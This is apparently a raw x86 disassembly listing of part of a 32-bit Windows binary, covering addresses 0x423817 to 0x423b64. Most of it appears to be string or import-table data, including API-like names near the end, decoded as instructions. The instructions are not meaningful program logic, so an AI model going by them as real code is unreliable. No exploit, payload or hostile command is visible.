  423817:	rol    BYTE PTR [edx+0x0],0x18
  42381b:	rol    BYTE PTR [edx+0x0],0x1c
  42381f:	rol    BYTE PTR [edx+0x0],0x57
  423823:	inc    edi
  423824:	cmp    DWORD PTR [edi+0x41],ebx
  423827:	pop    eax
  423828:	ss push esi
  42382a:	pop    edi
  42382b:	cmp    BYTE PTR [eax],al
  42382d:	inc    ebx
  42382e:	inc    ebp
  42382f:	dec    esp
  423830:	pop    edi
  423831:	pop    eax
  423832:	push   edi
  423833:	dec    eax
  423834:	inc    edx
  423835:	add    BYTE PTR [edi+0x50],dl
  423838:	xor    eax,0x4641365f
  42383d:	cmp    DWORD PTR [edx],esi
  42383f:	xor    ebx,DWORD PTR [edi+0x32]
  423842:	aaa    
  423843:	add    BYTE PTR [eax+0x48],dl
  423846:	xor    BYTE PTR [edi+0x58],bl
  423849:	push   esp
  42384a:	inc    ecx
  42384b:	dec    ebp
  42384c:	push   ecx
  42384d:	pop    edi
  42384e:	inc    esi
  42384f:	push   ebp
  423850:	cmp    DWORD PTR [eax],eax
  423852:	push   edi
  423853:	push   ebp
  423854:	inc    ecx
  423855:	xor    dh,BYTE PTR [ebx]
  423857:	xor    ebx,DWORD PTR [edi+0x4e]
  42385a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42385e:	cmp    DWORD PTR [edi+0x38],ebx
  423861:	dec    ecx
  423862:	cmp    DWORD PTR [edx+0x36],ebx
  423865:	pop    edi
  423866:	dec    edx
  423867:	xor    BYTE PTR [edx+0x34],cl
  42386a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42386e:	xor    esi,DWORD PTR [eax]
  423870:	pop    edi
  423871:	inc    edx
  423872:	dec    ebx
  423873:	pop    eax
  423874:	pop    eax
  423875:	xor    eax,0x51414d00
  42387a:	pop    edi
  42387b:	inc    ecx
  42387c:	xor    al,BYTE PTR [ebp+0x5f]
  42387f:	inc    ecx
  423880:	dec    ebx
  423881:	cmp    DWORD PTR ds:0x5a003939,esi
  423887:	inc    ebp
  423888:	cmp    BYTE PTR [edi+0x4d],bl
  42388b:	ss dec eax
  42388d:	dec    ebx
  42388e:	add    BYTE PTR [ebp+0x57],al
  423891:	xor    DWORD PTR [edi+0x31],ebx
  423894:	dec    ebx
  423895:	xor    eax,DWORD PTR [ecx+0x30]
  423898:	push   ebx
  423899:	add    BYTE PTR [edx+esi*1+0x36],al
  42389d:	aaa    
  42389e:	pop    edi
  42389f:	push   edx
  4238a0:	dec    eax
  4238a1:	dec    ebp
  4238a2:	cmp    BYTE PTR [edi+0x37],bl
  4238a5:	inc    esi
  4238a6:	xor    eax,0x43355500
  4238ab:	pop    edi
  4238ac:	pop    ecx
  4238ad:	dec    ecx
  4238ae:	push   ebx
  4238af:	xor    bl,BYTE PTR [edi+0x52]
  4238b2:	add    BYTE PTR [eax+0x55],dl
  4238b5:	dec    ecx
  4238b6:	xor    BYTE PTR [edi+0x43],bl
  4238b9:	ss inc ebp
  4238bb:	xor    bl,BYTE PTR [edi+0x4d]
  4238be:	xor    al,0x4a
  4238c0:	push   edx
  4238c1:	push   ebp
  4238c2:	add    BYTE PTR [esi+0x39],cl
  4238c5:	push   eax
  4238c6:	pop    edi
  4238c7:	push   ebp
  4238c8:	cmp    DWORD PTR [esi],esi
  4238ca:	xor    BYTE PTR [ecx],dh
  4238cc:	pop    edi
  4238cd:	dec    edi
  4238ce:	dec    esi
  4238cf:	push   esp
  4238d0:	cmp    BYTE PTR [eax],al
  4238d2:	dec    esp
  4238d3:	xor    al,0x44
  4238d5:	xor    DWORD PTR [edi+0x4b],ebx
  4238d8:	xor    DWORD PTR [ebp+0x5f],eax
  4238db:	pop    edx
  4238dc:	add    BYTE PTR [edi+esi*1+0x43],dl
  4238e0:	pop    edi
  4238e1:	inc    edx
  4238e2:	xor    dh,BYTE PTR [ecx]
  4238e4:	push   ebx
  4238e5:	xor    DWORD PTR [ecx],edi
  4238e7:	inc    edx
  4238e8:	add    BYTE PTR [edi+0x45],al
  4238eb:	xor    al,0x38
  4238ed:	xor    BYTE PTR [eax],dh
  4238ef:	pop    edi
  4238f0:	dec    edx
  4238f1:	dec    ebx
  4238f2:	xor    eax,0x33345f4d
  4238f7:	add    BYTE PTR [ebx+esi*1+0x57],cl
  4238fb:	pop    edi
  4238fc:	aaa    
  4238fd:	push   esi
  4238fe:	dec    ebx
  4238ff:	push   edx
  423900:	pop    edi
  423901:	inc    ebx
  423902:	add    BYTE PTR [edx+0x35],bl
  423905:	dec    ebp
  423906:	pop    edi
  423907:	inc    edi
  423908:	dec    esi
  423909:	xor    al,0x49
  42390b:	xor    eax,0x54590035
  423910:	push   edx
  423911:	pop    edi
  423912:	push   esp
  423913:	inc    ebx
  423914:	inc    ecx
  423915:	pop    edi
  423916:	cmp    DWORD PTR [ecx+0x41],ebx
  423919:	push   ebp
  42391a:	pop    edi
  42391b:	push   ebp
  42391c:	inc    ebp
  42391d:	add    BYTE PTR [esi+esi*1+0x35],cl
  423921:	pop    edi
  423922:	pop    eax
  423923:	dec    edx
  423924:	inc    edx
  423925:	inc    edi
  423926:	add    BYTE PTR [edx+0x36],al
  423929:	inc    ebx
  42392a:	pop    edi
  42392b:	xor    BYTE PTR ds:0x36464b,dh
  423931:	dec    ebx
  423932:	cmp    DWORD PTR [esi+0x37],eax
  423935:	xor    ebx,DWORD PTR [edi+0x35]
  423938:	ss inc edi
  42393a:	pop    ecx
  42393b:	dec    eax
  42393c:	pop    ecx
  42393d:	add    BYTE PTR [ebp+0x35],cl
  423940:	push   eax
  423941:	xor    BYTE PTR [edi+0x4f],bl
  423944:	pop    ecx
  423945:	xor    cl,BYTE PTR [edi+0x0]
  423948:	pop    ecx
  423949:	xor    DWORD PTR [esi+0x5f],ecx
  42394c:	xor    al,BYTE PTR [edx+0x30]
  42394f:	push   esi
  423950:	push   esp
  423951:	inc    ebp
  423952:	add    BYTE PTR [edi+0x37],al
  423955:	push   esi
  423956:	xor    DWORD PTR [edi+0x49],ebx
  423959:	xor    al,BYTE PTR [esi+0x30]
  42395c:	pop    edi
  42395d:	ss dec esi
  42395f:	cmp    BYTE PTR [eax],al
  423961:	pop    edx
  423962:	xor    eax,0x445f334b
  423967:	xor    BYTE PTR [eax],bh
  423969:	push   ecx
  42396a:	push   esi
  42396b:	xor    al,0x0
  42396d:	push   ebp
  42396e:	pop    eax
  42396f:	inc    edi
  423970:	xor    DWORD PTR [edi+0x39],ebx
  423973:	push   esp
  423974:	inc    ebx
  423975:	aaa    
  423976:	inc    esp
  423977:	add    BYTE PTR [edi+0x39],dl
  42397a:	ss pop edi
  42397c:	dec    eax
  42397d:	pop    edx
  42397e:	pop    ecx
  42397f:	inc    edi
  423980:	push   ebp
  423981:	pop    edi
  423982:	push   eax
  423983:	dec    eax
  423984:	inc    ebx
  423985:	add    BYTE PTR [ebp+0x0],dl
  423988:	xor    al,0x0
  42398a:	dec    edi
  42398b:	add    BYTE PTR [edi+0x0],bl
  42398e:	cmp    BYTE PTR [eax],al
  423990:	xor    al,BYTE PTR [eax]
  423992:	inc    ebx
  423993:	add    BYTE PTR [edx+0x0],bl
  423996:	inc    ebx
  423997:	add    BYTE PTR [edi],dh
  423999:	add    BYTE PTR [edi+0x0],bl
  42399c:	inc    ebx
  42399d:	add    BYTE PTR [eax+eax*1+0x0],al
  4239a1:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4239a5:	add    BYTE PTR [edx],dh
  4239a7:	add    BYTE PTR [edi+0x0],bl
  4239aa:	cmp    BYTE PTR [eax],al
  4239ac:	dec    esp
  4239ad:	add    BYTE PTR [esi+0x0],dl
  4239b0:	pop    edi
  4239b1:	add    BYTE PTR [ecx+0x0],bl
  4239b4:	push   edx
  4239b5:	add    BYTE PTR [esi+0x0],dl
  4239b8:	xor    al,BYTE PTR [eax]
  4239ba:	cmp    BYTE PTR [eax],al
  4239bc:	pop    edi
  4239bd:	add    BYTE PTR [edx+0x0],cl
  4239c0:	add    BYTE PTR [eax],al
  4239c2:	inc    edx
  4239c3:	add    BYTE PTR [eax+eax*1+0x46],cl
  4239c7:	add    BYTE PTR [edi+0x0],bl
  4239ca:	xor    eax,DWORD PTR [eax]
  4239cc:	inc    ebp
  4239cd:	add    BYTE PTR [ecx+0x0],cl
  4239d0:	push   edx
  4239d1:	add    BYTE PTR [ecx],bh
  4239d3:	add    BYTE PTR [esi+0x0],dl
  4239d6:	add    BYTE PTR [eax],al
  4239d8:	dec    ebp
  4239d9:	add    BYTE PTR [edi],dh
  4239db:	add    BYTE PTR [eax+eax*1+0x5f],al
  4239df:	add    BYTE PTR [edx+0x0],cl
  4239e2:	pop    eax
  4239e3:	add    BYTE PTR [ebx],dh
  4239e5:	add    BYTE PTR [ecx],dh
  4239e7:	add    BYTE PTR [ebx+0x0],al
  4239ea:	add    BYTE PTR [eax],al
  4239ec:	dec    edi
  4239ed:	add    BYTE PTR [esi],dh
  4239ef:	add    BYTE PTR [eax+0x0],cl
  4239f2:	pop    edi
  4239f3:	add    BYTE PTR [eax],dh
  4239f5:	add    BYTE PTR [edi],dh
  4239f7:	add    BYTE PTR [ecx],dh
  4239f9:	add    BYTE PTR [edx+0x0],dl
  4239fc:	xor    eax,0x55000000
  423a01:	add    BYTE PTR [eax+eax*1+0x5a],dl
  423a05:	add    BYTE PTR [edi+0x0],bl
  423a08:	push   esp
  423a09:	add    BYTE PTR [ecx+0x0],al
  423a0c:	cmp    DWORD PTR [eax],eax
  423a0e:	pop    edi
  423a0f:	add    BYTE PTR [ebx],dh
  423a11:	add    BYTE PTR [eax],dh
  423a13:	add    BYTE PTR [eax],bh
  423a15:	add    BYTE PTR [edi+0x0],cl
  423a18:	inc    ebx
  423a19:	add    BYTE PTR ds:0x4d000000,dh
  423a1f:	add    BYTE PTR [esi+0x0],cl
  423a22:	inc    ebp
  423a23:	add    BYTE PTR [edi+0x0],bl
  423a26:	push   esp
  423a27:	add    BYTE PTR [esi+0x0],al
  423a2a:	cmp    BYTE PTR [eax],al
  423a2c:	push   ebx
  423a2d:	add    BYTE PTR [edx+0x0],bl
  423a30:	pop    edi
  423a31:	add    BYTE PTR [eax],dh
  423a33:	add    BYTE PTR [eax],bh
  423a35:	add    BYTE PTR [eax+0x0],cl
  423a38:	add    BYTE PTR [eax],al
  423a3a:	dec    esi
  423a3b:	add    BYTE PTR [edi+0x0],cl
  423a3e:	pop    edx
  423a3f:	add    BYTE PTR [edi+0x0],bl
  423a42:	add    BYTE PTR ss:[ecx+0x0],bl
  423a46:	dec    ebp
  423a47:	add    BYTE PTR [esi],dh
  423a49:	add    BYTE PTR [ebx],dh
  423a4b:	add    BYTE PTR [edi+0x0],bl
  423a4e:	xor    al,0x0
  423a50:	dec    esi
  423a51:	add    BYTE PTR [edx],dh
  423a53:	add    BYTE PTR [esi],dh
  423a55:	add    BYTE PTR [ecx],dh
  423a57:	add    BYTE PTR [eax],al
  423a59:	add    BYTE PTR [ebx+0x0],cl
  423a5c:	dec    eax
  423a5d:	add    BYTE PTR [eax],bh
  423a5f:	add    BYTE PTR [edi+0x0],bl
  423a62:	inc    esi
  423a63:	add    BYTE PTR [esi+0x0],al
  423a66:	push   esp
  423a67:	add    BYTE PTR [edi],dh
  423a69:	add    BYTE PTR [esi],dh
  423a6b:	add    BYTE PTR [edi+0x0],bl
  423a6e:	dec    esp
  423a6f:	add    BYTE PTR [ecx+0x0],bl
  423a72:	add    BYTE PTR [eax],al
  423a74:	push   ebx
  423a75:	add    BYTE PTR [ecx+0x0],bl
  423a78:	xor    BYTE PTR [eax],al
  423a7a:	pop    edi
  423a7b:	add    BYTE PTR [ecx],bh
  423a7d:	add    BYTE PTR [edx+0x0],dl
  423a80:	dec    eax
  423a81:	add    BYTE PTR [ecx+0x0],bl
  423a84:	xor    al,BYTE PTR [eax]
  423a86:	pop    edi
  423a87:	add    BYTE PTR [eax],dh
  423a89:	add    BYTE PTR [eax],al
  423a8b:	add    BYTE PTR [edx+0x0],al
  423a8e:	dec    edx
  423a8f:	add    BYTE PTR [esi+0x0],cl
  423a92:	xor    al,BYTE PTR [eax]
  423a94:	pop    edi
  423a95:	add    BYTE PTR [eax+eax*1+0x33],cl
  423a99:	add    BYTE PTR [edx+0x0],dl
  423a9c:	xor    al,0x0
  423a9e:	dec    eax
  423a9f:	add    BYTE PTR [eax],al
  423aa1:	add    BYTE PTR [ebp+0x0],dl
  423aa4:	add    BYTE PTR ss:[ebp+0x0],cl
  423aa8:	xor    DWORD PTR [eax],eax
  423aaa:	pop    edi
  423aab:	add    BYTE PTR [esi],dh
  423aad:	add    BYTE PTR [ecx+0x0],bl
  423ab0:	push   ebp
  423ab1:	add    BYTE PTR [eax+eax*1+0x5f],dl
  423ab5:	add    BYTE PTR [edi+0x0],cl
  423ab8:	inc    esp
  423ab9:	add    BYTE PTR [edi+0x0],dl
  423abc:	push   ebx
  423abd:	add    BYTE PTR [eax],al
  423abf:	add    BYTE PTR [edx+0x0],bl
  423ac2:	inc    ebx
  423ac3:	add    BYTE PTR [ebp+0x0],dl
  423ac6:	pop    edi
  423ac7:	add    BYTE PTR [ecx],dh
  423ac9:	add    BYTE PTR [ebp+0x0],al
  423acc:	push   esp
  423acd:	add    BYTE PTR [eax],dh
  423acf:	add    BYTE PTR [eax],al
  423ad1:	add    BYTE PTR [eax],al
  423ad3:	add    BYTE PTR [eax],al
  423ad5:	add    BYTE PTR [eax-0x7ffbffbe],al
  423adb:	inc    edx
  423adc:	add    BYTE PTR [eax],cl
  423ade:	add    BYTE PTR [edx+0x0],0xc
  423ae2:	add    BYTE PTR [edx+0x0],0x10
  423ae6:	add    BYTE PTR [edx+0x0],0x14
  423aea:	add    BYTE PTR [edx+0x0],0x18
  423aee:	add    BYTE PTR [edx+0x0],0x1c
  423af2:	add    BYTE PTR [edx+0x0],0x20
  423af6:	add    BYTE PTR [edx+0x0],0x24
  423afa:	add    BYTE PTR [edx+0x0],0x28
  423afe:	add    BYTE PTR [edx+0x0],0x0
	...
  423b12:	add    BYTE PTR [eax],al
  423b14:	sbb    edi,DWORD PTR [edi+0x4d57]
  423b1a:	add    BYTE PTR [eax],al
  423b1c:	inc    edx
  423b1d:	cmp    eax,DWORD PTR [edx]
  423b1f:	add    BYTE PTR [ecx],al
  423b21:	add    BYTE PTR [eax],al
  423b23:	add    BYTE PTR [ecx],al
  423b25:	add    BYTE PTR [eax],al
  423b27:	add    BYTE PTR [ecx],al
  423b29:	add    BYTE PTR [eax],al
  423b2b:	add    BYTE PTR [eax],bh
  423b2d:	cmp    eax,DWORD PTR [edx]
  423b2f:	add    BYTE PTR [ebx+edi*1],bh
  423b32:	add    al,BYTE PTR [eax]
  423b34:	inc    eax
  423b35:	cmp    eax,DWORD PTR [edx]
  423b37:	add    BYTE PTR [esi-0x31],al
  423b3a:	add    BYTE PTR [eax],al
  423b3c:	dec    esi
  423b3d:	cmp    eax,DWORD PTR [edx]
  423b3f:	add    BYTE PTR [eax],al
  423b41:	add    BYTE PTR [edi+0x6f],dl
  423b44:	jb     0x423baa
  423b46:	push   edi
  423b47:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  423b4e:	aas    
  423b4f:	inc    ebp
  423b50:	outs   dx,BYTE PTR ds:[esi]
  423b51:	jne    0x423bc0
  423b53:	push   edi
  423b54:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  423b5b:	popa   
  423b5c:	je     0x423bc7
  423b5e:	outs   dx,DWORD PTR ds:[esi]
  423b5f:	outs   dx,BYTE PTR ds:[esi]
  423b60:	jae    0x423bb5
  423b62:	je     0x423bc5
  423b64:	.byte 0x74
